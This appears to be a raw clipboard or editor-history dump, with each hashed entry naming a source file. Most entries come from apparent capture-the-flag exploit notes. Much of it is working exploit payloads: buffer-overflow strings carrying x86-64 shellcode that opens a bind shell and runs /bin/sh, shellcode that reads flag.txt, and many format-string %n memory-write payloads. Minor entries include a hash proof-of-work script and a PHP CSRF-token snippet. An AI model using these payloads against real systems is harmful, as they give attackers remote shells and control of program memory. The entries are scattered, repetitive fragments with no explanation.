	\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba\x01\x01\x01\x01\x81\xf2\x03\x01\x06\xd0\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7\x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99\x0f\x05\x48\x89\xc5\x6a\x03\x5e\x48\xff\xce\x78\x0b\x56\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05
6f9f5986498209702b1dac9d9739bba9|file:///home/neo/ccsc/guydebois/shellcode.txt|48|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba\x01\x01\x01\x01\x81\xf2\x03\x01\x06\xd0\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7\x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99\x0f\x05\x48\x89\xc5\x6a\x03\x5e\x48\xff\xce\x78\x0b\x56\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"`
3981eed3beaa0ac6aef9ebb10c78742e|file:///home/neo/ccsc/guydebois/shellcode.txt|48|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba\x01\x01\x01\x01\x81\xf2\x03\x01\x06\xd0\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7\x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99\x0f\x05\x48\x89\xc5\x6a\x03\x5e\x48\xff\xce\x78\x0b\x56\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"
3f09d9b09820b680a948ea0862ac2d65|file:///home/neo/ccsc/guydebois/shellcode.txt|49|1|V|text
	\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba\x01\x01\x01\x01\x81\xf2\x03\x01\x10\x5d\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7\x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99\x0f\x05\x48\x89\xc5\x6a\x03\x5e\x48\xff\xce\x78\x0b\x56\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05
b67604be4e4b3c3230add0f3d863c72f|file:///home/neo/ccsc/guydebois/shellcode.txt|48|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba\x01\x01\x01\x01\x81\xf2\x03\x01\x10\x5d\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7\x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99\x0f\x05\x48\x89\xc5\x6a\x03\x5e\x48\xff\xce\x78\x0b\x56\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"`
abf84ae6f5ff3a5b8a614f91e8f3cd23|file:///home/neo/ccsc/guydebois/shellcode.txt|48|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba\x01\x01\x01\x01\x81\xf2\x03\x01\x10\x5d\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7\x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99\x0f\x05\x48\x89\xc5\x6a\x03\x5e\x48\xff\xce\x78\x0b\x56\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"
4f54318d1f8ba0f88da2d6f103806739|file:///home/neo/ccsc/guydebois/shellcode.txt|48|192|v|text
	\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba\x01\x01\x01\x01\x81\xf2\x03\x01\x10\x5d\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7\x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99\x0f\x05\x48\x89\xc5\x6a\x03\x5e\x48\xff\xce\x78\x0b\x56\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"`
787d57c4c5ac336cb27b64807e57f306|file:///home/neo/ccsc/guydebois/shellcode.txt|48|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00"`
b60b5e599a586756cde690103e4bb61b|file:///home/neo/ccsc/guydebois/shellcode.txt|51|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x2d\x31\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x66\x69\x6c\x65\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"`
fb932566ec92b986bf290da952ed9442|file:///home/neo/ccsc/guydebois/shellcode.txt|51|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x2d\x31\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x66\x69\x6c\x65\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
423d39edd569fc8535619db6a362988b|file:///home/neo/ccsc/guydebois/shellcode.txt|52|1|V|text
	\x68\x79\x75\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05
72711c1920a6d37442ae3274ea24bea6|file:///home/neo/ccsc/guydebois/shellcode.txt|53|1|V|text
	\x48\x31\xC0\x48\x83\xC0\x3C\x48\x31\xFF\x0F\x05
a405b5260e63cbe307c0fd1c1cf824c4|file:///home/neo/ccsc/guydebois/shellcode.txt|51|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x79\x75\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05\x48\x31\xC0\x48\x83\xC0\x3C\x48\x31\xFF\x0F\x05"`
23e5e472833bfa4a9ac6d55e1e42245b|file:///home/neo/ccsc/guydebois/shellcode.txt|51|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x79\x75\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05\x48\x31\xC0\x48\x83\xC0\x3C\x48\x31\xFF\x0F\x05"
6b4036e4bc00a311e93e0342af68d34f|file:///home/neo/ccsc/guydebois/shellcode.txt|51|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x78\x74\x2c\x31\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05\x48\x31\xC0\x48\x83\xC0\x3C\x48\x31\xFF\x0F\x05"`
83766e0f95882846752e2294ceac7555|file:///home/neo/ccsc/guydebois/shellcode.txt|51|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x78\x74\x2c\x31\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05\x48\x31\xC0\x48\x83\xC0\x3C\x48\x31\xFF\x0F\x05"
b8db163ab2ca6ee0df66749d2b01bb67|file:///home/neo/ccsc/djinn/partial.py|1|1|V|python
	import hashlib
	import time
	import math
	
	def init(text):
	    global textInput
	    textInput = text
	    
	def findCollision(arg):
	    global textInput
	    msg = textInput + ':' + str(arg)
	    hsh = hashlib.sha256(msg.encode(encoding='utf_8', errors='strict')).hexdigest()
	    res = int(hsh, 16) & mask
	    if res == 0:
	        return msg
	 
	def multiProcessHash(text):
	    mult = 1
	    numValues = 10**6
	    chunkSize = math.ceil(numValues/mp.cpu_count())
	    found = False
	    msg = None
	    ti = time.time()
	   
	    pool = mp.Pool(initializer=init, initargs=[text])
	    while not found: 
	        sample = range(numValues*(mult-1), numValues*mult)
	        mult += 1
	        results = pool.imap_unordered(findCollision, sample, chunkSize)
	        for msg in results:
	            if msg:
	                pool.terminate()
	                pool.join()
	                found = True
	                break
	 
	    print('Multi-process run time: {:0.4f}'.format(time.time()-ti))
	    print('Message: ', msg)
	    return msg
9a7aa8491517bf3a29eb4fc99ca16906|file:///home/neo/ccsc/djinn/partial.py|4|1|V|python
	
	def init(text):
	    global textInput
	    textInput = text
	    
	def findCollision(arg):
	    global textInput
	    msg = textInput + ':' + str(arg)
	    hsh = hashlib.sha256(msg.encode(encoding='utf_8', errors='strict')).hexdigest()
	    res = int(hsh, 16) & mask
	    if res == 0:
	        return msg
	 
	def multiProcessHash(text):
	    mult = 1
	    numValues = 10**6
	    chunkSize = math.ceil(numValues/mp.cpu_count())
	    found = False
	    msg = None
	    ti = time.time()
	   
	    pool = mp.Pool(initializer=init, initargs=[text])
	    while not found: 
	        sample = range(numValues*(mult-1), numValues*mult)
	        mult += 1
	        results = pool.imap_unordered(findCollision, sample, chunkSize)
	        for msg in results:
	            if msg:
	                pool.terminate()
	                pool.join()
	                found = True
	                break
	 
	    print('Multi-process run time: {:0.4f}'.format(time.time()-ti))
	    print('Message: ', msg)
	    return msg
86e0dab897621bf75361a5a5c2e9e8d7|file:///home/neo/.config/sxhkd/sxhkdrc|43|31|v|conf
	mozilla-central
ebbb63f0bcfba358f58c23817a4f3e3a|file:///home/neo/ccsc/guydebois/shellcode.txt|39|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"
b3d4ffa73fbc717156bd594e631b7255|file:///home/neo/ccsc/guydebois/shellcode.txt|39|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"`
25890deab1075e916c06b9e1efc2e25f|file:///home/neo/ccsc/spell/fmt.py|5|16|v|python
	vulnerable
f7531e2d0ea27233ce00b5f01c5bf335|file:///home/neo/ccsc/spell/notes|1|2|v|
	print
210b8480909e6b7029192754bb868dc7|file:///home/neo/ccsc/spell/notes|6|1|V|
	 r <<< `echo -e 'AA\xd9\xce\xff\xff\xda\xce\xff\xff\xdb\xce\xff\xff\xdc\xce\xff\xff%146x%11$n%207x%12$n%127x%13$n%260x%14$n'`
14783b065f716590ce5bf2ad26655e45|file:///home/neo/ccsc/spell/notes|3|1|V|
	 r <<< `echo -e 'AA\xe0\xcd\xff\xff\xe1\xcd\xff\xff\xe2\xcd\xff\xff\xe3\xcd\xff\xff%146x%11$n%207x%12$n%127x%13$n%260x%14$n'`
702bac67935389d7f60d9a6fa1fb1b5e|file:///home/neo/ccsc/spell/notes|7|8|v|
	echo -e 'AA\xdc\xce\xff\xff\xdd\xce\xff\xff\xde\xce\xff\xff\xdf\xce\xff\xff%146x%11$n%207x%12$n%127x%13$n%260x%14$n'
e949b694eb9cc3a8a99bc95f70496ad6|file:///home/neo/ccsc/spell/notes|7|1|V|
	r <<< `echo -e 'AA\xdc\xce\xff\xff\xdd\xce\xff\xff\xde\xce\xff\xff\xdf\xce\xff\xff%146x%11$n%207x%12$n%127x%13$n%260x%14$n'`
3db510caff1f7c424bece0377e483e2a|file:///home/neo/ccsc/spell/notes|9|19|^v|
	\xdc\xce\xff\xff\xdd\xce\xff\xff\xde\xce\xff\xff\xdf\xce\xff\xff%
0192926309f636aa63d06f19bba385fa|file:///home/neo/ccsc/spell/notes|9|1|V|
	r <<< `echo -e 'AA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%146x%11$n%207x%12$n%127x%13$n%260x%14$n'`
5881b3fa0a6f66972d41f4bd8c94face|file:///home/neo/ccsc/spell/notes|9|8|v|
	echo -e 'AA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%146x%11$n%207x%12$n%127x%13$n%260x%14$n'
e939dffc25c9d6509633a9ad025fc12b|file:///home/neo/ccsc/spell/notes|11|1|V|
	r <<< `echo -e 'AA\x30\x84\x04\x08\x31\x84\x04\x08\x32\x84\x04\x08\x33\x84\x04\x08%146x%11$n%207x%12$n%127x%13$n%260x%14$n'`
b36be9998d302fdf76e01f9249364139|file:///home/neo/ccsc/spell/notes|7|6|v|
	 `echo -e 'AA\xdc\xce\xff\xff\xdd\xce\xff\xff\xde\xce\xff\xff\xdf\xce\xff\xff%146x%11$n%207x%12$n%127x%13$n%260x%14$n'`
3660828b2cb32c7939d9374f389684f6|file:///tmp/neomutt-neo-1000-3143-4880486846766512050|2|1|V|mail
	So for now I will wait to see if the university organizes the
c297c2e2d30506f838301f1e48e22fdd|file:///home/neo/ccsc/spell/fmt.py|30|1|V|python
	format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
a777b4d9b0a4a61f9433b03c489f4f11|file:///home/neo/ccsc/spell/fmt.py|29|35|v|python
	1337babe
8ed8ff64b719eb2ffafd64f12a14ee5b|file:///home/neo/ccsc/spell/fmt.py|29|43|v|python
	 # write 0x1337babe at 0x0
f9ed0286239ac623f7eef7724db7c6e4|file:///home/neo/ccsc/spell/notes|10|1|V|
	r <<< `echo -e 'AA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%146x%11$n%207x%12$n%127x%13$n%260x%14$n'`
	
9c631c936f96c691e8fd0a2fcfce5673|file:///home/neo/ccsc/spell/notes|13|1|V|
	r <<< `echo -e 'aa\x48\x9c\x04\x08%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n'`
c2e3c8286abc36756b4838f729acd0b0|file:///home/neo/ccsc/spell/notes|10|19|v|
	\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08
6051c72599290b87bdc8587fe749d113|file:///home/neo/ccsc/spell/notes|15|1|V|
	`echo -e 'aa\x48\x9c\x04\x08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n'`
ec5b00b3aed13552385407e9be207a95|file:///home/neo/ccsc/spell/notes|16|1|V|
	r <<< `echo -e 'aa\x48\x9c\x04\x08\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n'`
483c804d1c2cd48888388adaa16a6416|file:///home/neo/ccsc/spell/notes|10|83|v|
	%146x%11$n%207x%12$n%127x%13$n%260x%14$n
7d3a31f3da626001e9a739fe0e1d6647|file:///home/neo/ccsc/spell/notes|16|1|V|
	r <<< `echo -e 'aa\x48\x9c\x04\x08\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n%146x%11$n%207x%12$n%127x%13$n%260x%14$n'`
4368d01260827a689288487a92c203f6|file:///home/neo/ccsc/spell/notes|16|6|v|
	 `echo -e 'aa\x48\x9c\x04\x08\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n%146x%11$n%207x%12$n%127x%13$n%260x%14$n'`
b5be353bde326d9411d35d742c2806d5|file:///home/neo/ccsc/spell/notes|16|15|v|
	 'aa\x48\x9c\x04\x08\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n%146x%11$n%207x%12$n%127x%13$n%260x%14$n'
d6351b13f68768509fe7eb69e4f8e392|file:///home/neo/ccsc/spell/notes|10|17|v|
	AA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%146x%11$n%207x%12$n%127x%13$n%260x%14$n
52163f0ec07a8848a347ce3615dec521|file:///home/neo/ccsc/spell/notes|10|15|v|
	 'AA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%146x%11$n%207x%12$n%127x%13$n%260x%14$n'
3fb97c762aff2531e6de36f8e7e863b3|file:///home/neo/ccsc/spell/notes|13|8|v|
	echo -e 'aa\x48\x9c\x04\x08%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n'
634097c1ec153780586670e55e495255|file:///home/neo/ccsc/spell/notes|10|19|v|
	\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%146x%11$n%207x%12$n%127x%13$n%260x%14$n
a4fc94aa1774d4624c18b367ef809680|file:///home/neo/ccsc/spell/notes|10|19|^v|
	\x28\x9c\x04\x08\
90c232186c663cfc98aa80246a6327e5|file:///home/neo/ccsc/spell/notes|15|1|V|
	echo -e 'aa\x48\x9c\x04\x08%11$08n'
41dd38688636bee328220f483710ce76|file:///home/neo/ccsc/spell/notes|10|17|v|
	AA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%146x%11$n%207x%12$n%127x%13$n%260x%14$n'
1a30e504bea6fefd83c68ecbe2ce1d85|file:///home/neo/ccsc/spell/notes|19|1|V|
	 r <<< `echo -e 'aa\x48\x9c\x04\x08%11$nAAA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%146x%14$n%207x%15$n%127x%16$n%260x%17$n''`
b2ae9bd5ec4a75562c1e6f08897ba80d|file:///home/neo/ccsc/spell/notes|19|1|V|
	 r <<< `echo -e 'aa\x48\x9c\x04\x08%11$nAAA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%146x%14$n%207x%15$n%127x%16$n%260x%17$n'`
567af15495850686c7a6a4be938d86db|file:///home/neo/ccsc/spell/notes|10|35|^v|
	\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%
1e279a5990028763261f5b168b67fecc|file:///home/neo/ccsc/spell/notes|10|17|v|
	AA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08
a9dc9f8ead0f63a8be31b25dc6cbab1e|file:///home/neo/ccsc/spell/notes|17|88|v|
	%14$n%207x%15$n%127x%16$n%260x%17$n
480fb6e7d68e5073f9e4d674c6cae040|file:///home/neo/ccsc/spell/notes|17|83|v|
	%146x%14$n%207x%15$n%127x%16$n%260x%17$n
115cd6ff0d6289fcc45ed6cc847dfdc9|file:///home/neo/ccsc/spell/notes|17|1|V|
	r <<< `echo -e 'aa\x48\x9c\x04\x08%11$nAAA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%14$n%15$n%16$n%17$n'`
df45fb7d52090d4f272d637daaee7912|file:///home/neo/ccsc/spell/notes|18|9|v|
	echo -e 'aa\x48\x9c\x04\x08%11$nAAA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%139x%14$n%207x%15$n%127x%16$n%260x%17$n'
c179282c32c3c1ab7a5978f9d5ca6920|file:///home/neo/ccsc/spell/notes|18|1|V|
	 r <<< `echo -e 'aa\x48\x9c\x04\x08%11$nAAA\x28\x9c\x04\x08\x29\x9c\x04\x08\x2a\x9c\x04\x08\x2b\x9c\x04\x08%139x%14$n%207x%15$n%127x%16$n%260x%17$n'`
d8d64661c57dfcb426eb578a02137f26|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1376|1|V|php
	                <input name="CSRFtoken" type="hidden" value="' . $token . '">
37bf8a7ad99727fee3d2ad0be19fe14d|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1372|1|V|php
	        echo '
	            <form method="post">
	                <input name="user">
	                <input name="pass" type="password">
	                <input type="submit">
	            </form>
	        '
d82e7165b85cc5c8b8c3ce06b857b1ec|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1361|1|V|php
	 <?php
	    if (isset($_POST["user"], $_POST["pass"]){
	        // Make sure the token from the login form is the same as in the cookie
	        if (isset($_POST["CSRFtoken"], $_COOKIE["CSRFtoken"])){
	            if ($_POST["CSRFtoken"] == $_COOKIE["CSRFtoken"]){
	                // code for checking the user and password
	            }
	        }
	    } else {
	        $token = bin2hex(openssl_random_pseudo_bytes(16));
	        setcookie("CSRFtoken", $token, time() + 60 * 60 * 24);
	    }
	?>
35d805d08c309d3e555c044fdb3c738c|file:///home/neo/ccsc/guydebois/shellcode.txt|59|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x49\x89\xf8\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05"`
51f31f75a41f9cb39ee49b106e4a99b4|file:///home/neo/ccsc/guydebois/shellcode.txt|42|1|V|text
